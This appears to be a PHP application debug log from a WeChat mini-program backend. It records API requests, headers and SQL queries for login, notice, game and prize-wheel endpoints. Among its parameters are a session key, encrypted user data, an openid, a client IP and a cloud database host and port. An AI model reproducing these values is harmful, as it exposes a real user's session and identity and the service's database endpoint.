  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->activity[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.046800s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_activity` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT `id`,`image`,`title`,`desc`,`url` FROM `fa_activity` WHERE  `status` = 'normal' ORDER BY `weigh` DESC [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:05+08:00 ] 112.64.68.53 GET /relaxed/public/index.php/api/content/usergift
[ info ] picc.18178.net/relaxed/public/index.php/api/content/usergift [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：2,458.77kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'usergift',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'br, gzip, deflate',
  'accept-language' => 'zh-cn',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->usergift[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.031200s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_usergift` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT `image`,`images`,`title` FROM `fa_usergift` LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:05+08:00 ] 112.64.68.53 GET /relaxed/public/index.php/api/content/expiretime
[ info ] picc.18178.net/relaxed/public/index.php/api/content/expiretime [运行时间：0.171601s][吞吐率：5.83req/s] [内存消耗：2,456.30kb] [文件加载：72]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'expiretime',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'br, gzip, deflate',
  'accept-language' => 'zh-cn',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->expiretime[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.031200s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_conversion` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT * FROM `fa_conversion` WHERE  `status` = '未使用' [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:05+08:00 ] 112.64.68.53 GET /relaxed/public/index.php/api/content/games
[ info ] picc.18178.net/relaxed/public/index.php/api/content/games [运行时间：0.202801s][吞吐率：4.93req/s] [内存消耗：2,462.59kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'games',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'br, gzip, deflate',
  'accept-language' => 'zh-cn',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->games[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.046800s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_games` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT `image`,`title`,`desc`,`appid` FROM `fa_games` WHERE  `status` = 'normal' ORDER BY `weigh` DESC [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:06+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/userinfo/index
[ info ] picc.18178.net/relaxed/public/index.php/api/userinfo/index [运行时间：1.466403s][吞吐率：0.68req/s] [内存消耗：2,466.06kb] [文件加载：76]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'userinfo',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '43',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'code' => '011QDfER1cOix31ZhqBR1DUeER1QDfET',
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Userinfo->index[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Userinfo.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.031200s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_user` [ RunTime:0.031200s ]
[ sql ] [ SQL ] SELECT `uid`,`openid` FROM `fa_user` WHERE  `openid` = 'o7G-45a7u9fhzxOoEFlnjMkmJ0ys' LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:07+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/userinfo/login
[ info ] picc.18178.net/relaxed/public/index.php/api/userinfo/login [运行时间：0.202801s][吞吐率：4.93req/s] [内存消耗：2,476.80kb] [文件加载：76]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'userinfo',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '810',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'sessionkey' => 'WaU48LawYaLmQCi7yk9F/Q==',
  'encryptedData' => 'L9Rk+EDiJQfS8us7ZuoUhRVqouEc6t70VjhJDQzUdFl8c8c+S53qVvGdr7DHfpGG585c+a1UmuD3cwXRhNGV9G35m0EoKnRDpmNv3t+V8dgbXDCom0o431Os+SY34Eq95uYc0CqwYDFPtAKPNPe8vUQtV3uAr56dHskKwRd/Fn2CrAqvndgwO4DRuEC2ez4wViFIGWT5KYajuyM9ukus6+ZZhik+CFHzZUnayMMqtxczCnfoqOv6Yj/SXCUPATFTDav20v1fHA07QqIqdRbW+FszodbjKiFzp1aOnh8PaCXuJpQDcS/5m0tmDkMstZ1vb27rBP53fl4KKQAirb6jmPw2+vahe8bUp+vYRDbqKC6z0MLxOD7ISpyt2M21gBbjqgWHh1CiPBECQVrzHaO8vIM01CenbiHxx1TcI8o7zlrn4x3Kk6tjmmRvRedkBS0HMoGDx6IzJLFkHJXLkAKCMrIN/+4GYVwabEtME8z7SvHqzV5Hyj+t9+GE7KMYhcKV7du0igLv/5rVk67sN+W/GA==',
  'iv' => 'R1YwgWKF8qkDeqhksneInQ==',
  'nickName' => 'BULL',
  'avatarUrl' => 'https://wx.qlogo.cn/mmopen/vi_32/4a9X9GXCqJ6VPJywYFgzuLBFdpxKfTjUZ4Da3aD8L1WL5novHGk39KBZeTT2Np4mSdNquIr6eXAVjjiahR1rlQw/132',
  'uid' => 1000017,
  'gender' => 1,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Userinfo->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Userinfo.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.031201s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_user` [ RunTime:0.031200s ]
[ sql ] [ SQL ] SELECT `nickname`,`avatar` FROM `fa_user` WHERE  `uid` = 1000017 LIMIT 1 [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT `uid`,`nickname`,`username`,`avatar`,`sign`,`gender`,`gold`,`score`,`mobile`,`city`,`constellation`,`idnumber`,`birthday`,`isnew` FROM `fa_user` WHERE  `uid` = 1000017 LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:07+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/userinfo/usenotice
[ info ] picc.18178.net/relaxed/public/index.php/api/userinfo/usenotice [运行时间：0.171600s][吞吐率：5.83req/s] [内存消耗：2,447.41kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'userinfo',
    2 => 'usenotice',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '15',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'uid' => 1000017,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Userinfo->usenotice[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Userinfo.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.015600s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_notices` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_notices` WHERE  `uid` = 1000017  AND `type` = 'no' LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:35:07+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/content/remind
[ info ] picc.18178.net/relaxed/public/index.php/api/content/remind [运行时间：0.171600s][吞吐率：5.83req/s] [内存消耗：2,465.50kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'remind',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '15',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'uid' => 1000017,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->remind[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.015600s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_indent` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_indent` WHERE  `type` = 'no'  AND `uid` = 1000017 LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:36:13+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/userinfo/usenotice
[ info ] picc.18178.net/relaxed/public/index.php/api/userinfo/usenotice [运行时间：0.171600s][吞吐率：5.83req/s] [内存消耗：2,447.41kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'userinfo',
    2 => 'usenotice',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '15',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'uid' => 1000017,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Userinfo->usenotice[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Userinfo.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.031200s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_notices` [ RunTime:0.031200s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_notices` WHERE  `uid` = 1000017  AND `type` = 'no' LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:36:13+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/content/remind
[ info ] picc.18178.net/relaxed/public/index.php/api/content/remind [运行时间：0.156000s][吞吐率：6.41req/s] [内存消耗：2,465.50kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'remind',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '15',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'uid' => 1000017,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->remind[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.015600s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_indent` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_indent` WHERE  `type` = 'no'  AND `uid` = 1000017 LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:36:14+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/content/surplus_num
[ info ] picc.18178.net/relaxed/public/index.php/api/content/surplus_num [运行时间：0.202800s][吞吐率：4.93req/s] [内存消耗：2,466.63kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'surplus_num',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '15',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'uid' => 1000017,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Content->surplus_num[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.031200s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_turntableconfig` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT * FROM `fa_turntableconfig` LIMIT 1 [ RunTime:0.015600s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_record` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT count(uid) FROM `fa_record` WHERE  `createtime` >= 1549987200  AND `uid` = 1000017 LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:36:16+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/content/surplus_num
[ info ] picc.18178.net/relaxed/public/index.php/api/content/surplus_num [运行时间：0.202800s][吞吐率：4.93req/s] [内存消耗：2,466.63kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'content',
    2 => 'surplus_num',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '15',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'uid' => 1000017,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
[ info ] [ RUN ] app\api\controller\Content->surplus_num[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Content.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.015600s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_turntableconfig` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT * FROM `fa_turntableconfig` LIMIT 1 [ RunTime:0.015600s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_record` [ RunTime:0.015600s ]
[ sql ] [ SQL ] SELECT count(uid) FROM `fa_record` WHERE  `createtime` >= 1549987200  AND `uid` = 1000017 LIMIT 1 [ RunTime:0.015600s ]
---------------------------------------------------------------
[ 2019-02-13T15:36:48+08:00 ] 112.64.68.53 POST /relaxed/public/index.php/api/userinfo/usenotice
[ info ] picc.18178.net/relaxed/public/index.php/api/userinfo/usenotice [运行时间：0.171601s][吞吐率：5.83req/s] [内存消耗：2,447.41kb] [文件加载：75]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'userinfo',
    2 => 'usenotice',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn',
  'content-length' => '15',
  'referer' => 'https://servicewechat.com/wxc89d469693cad993/0/page-frame.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 MicroMessenger/7.0.3(0x17000321) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'close',
  'accept-encoding' => 'br, gzip, deflate',
  'content-type' => 'application/json',
  'host' => 'picc.18178.net',
)
[ info ] [ PARAM ] array (
  'uid' => 1000017,
)
[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/api\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
[ info ] [ RUN ] app\api\controller\Userinfo->usenotice[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\api\controller\Userinfo.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.015600s ] mysql:host=sh-cdb-mwf0h7ig.sql.tencentcdb.com;port=62879;dbname=relaxed;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_notices` [ RunTime:0.015600s ]
